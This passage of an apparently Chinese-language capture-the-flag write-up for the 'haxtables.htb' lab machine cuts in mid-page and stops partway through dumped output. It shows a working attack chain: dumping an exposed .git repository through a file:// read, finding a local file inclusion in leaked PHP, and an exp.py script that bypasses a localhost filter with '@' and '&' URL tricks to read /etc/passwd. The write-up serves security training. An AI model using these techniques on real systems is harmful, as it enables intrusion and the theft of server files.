/var/www/image/.git/HEAD</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ref: refs&#x2F;heads&#x2F;master</span><br></pre></td></tr></table></figure><p>确认存在git</p><p>获取<code>GitTools</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/internetwache/GitTools</span><br></pre></td></tr></table></figure><p><code>./GitTools/Dumper/gitdumper.sh</code>的curl语句替换为如下语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://api.haxtables.htb/v3/tools/string/index.php&quot;</span> --json <span class="string">&quot;&#123;\&quot;action\&quot;:\&quot;b64encode\&quot;, \&quot;file_url\&quot;:\&quot;file:///var/www/image/.git/<span class="variable">$objname</span>\&quot;&#125;&quot;</span> | jq -r .data  | base64 -d &gt; <span class="string">&quot;<span class="variable">$target</span>&quot;</span></span><br></pre></td></tr></table></figure><p>获取项目文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash ./Dumper/gitdumper.sh http://images.haxtables.htb/.git/ /tmp/image/</span><br><span class="line">bash ./Extractor/extractor.sh /tmp/image/ /tmp/dump/</span><br></pre></td></tr></table></figure><p>得到<code>/action/action_header.php</code>内容</p><p>确认内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/actions/action_handler.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;No page specified!&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在可以进行LFI漏洞，请求<code>http://image.haxtables.htb/actions/action_handler.php?page=PAYLOAD</code>进行LFI_TO_RCE</p><p>确认<code>/etc/hosts</code>信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /etc/hosts</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 encoding</span><br><span class="line">127.0.0.1 haxtables.htb api.haxtables.htb image.haxtables.htb</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure><p>存在<code>image.haxtables.htb</code>的解析记录</p><p>编写<code>exp.py</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;http://image.haxtables.htb/actions/action_handler.php?page=%s&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line">res = req.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>进行LFI测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py file:///etc/passwd</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;Unacceptable URL&quot;&#125;</span><br></pre></td></tr></table></figure><p>查看<code>api.haxtables.htb/v3/tools/string/index.php</code>的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/api/v3/tools/string/index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../../../utils.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$jsondata</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="string">&#x27;file_url&#x27;</span>, <span class="variable">$jsondata</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = get_url_content(<span class="variable">$jsondata</span>[<span class="string">&#x27;file_url&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span>  === <span class="string">&#x27;str2hex&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; str2hex(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>  (<span class="variable">$action</span> === <span class="string">&#x27;hex2str&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span> =&gt; hex2str(<span class="variable">$data</span>) ]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;md5&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; md5(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;sha1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; sha1(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;urlencode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; urlencode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;urldecode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; urldecode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;b64encode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; base64_encode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;b64decode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; base64_decode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span>=&gt; <span class="string">&#x27;Invalid action&#x27;</span>], <span class="number">404</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看第一个<code>api.haxtables.htb/handler.php</code>的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/api/handler.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        http_response_code(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_included_contents</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">return</span> ob_get_clean();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (gethostbyname(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    jsonify([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_api_call</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_file</span>) &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; file_get_contents(<span class="variable">$data</span>),</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">    curl_setopt (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, json_encode(<span class="variable">$post</span>));</span><br><span class="line">    curl_setopt( <span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">    <span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>函数<code>get_url_content</code>禁止对127.0.0.1进行访问</p><p>页面调用功能时请求为<code>haxtables.htb/handler.php</code><br />查看其代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/html/handler.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../api/utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jsondata</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;uri_path&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        <span class="comment">// echo jsonify([&#x27;message&#x27; =&gt; file_get_contents(&#x27;php://input&#x27;)]);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = make_api_call(<span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>函数<code>make_api_call</code>无限制</p><p>但存在URL拼接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>前面的内容用<code>@</code>注释<br />后面的内容用<code>&amp;</code>注释</p><p>修改<code>exp.py</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri_path&#x27;</span> : <span class="string">&#x27;@image.haxtables.htb/actions/action_handler.php?page=%s&amp;&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line">res = req.post(<span class="string">&#x27;http://haxtables.htb/handler.php&#x27;</span>, json=json_data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>再次尝试LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:105:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:106:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:107:113::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:108:114::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 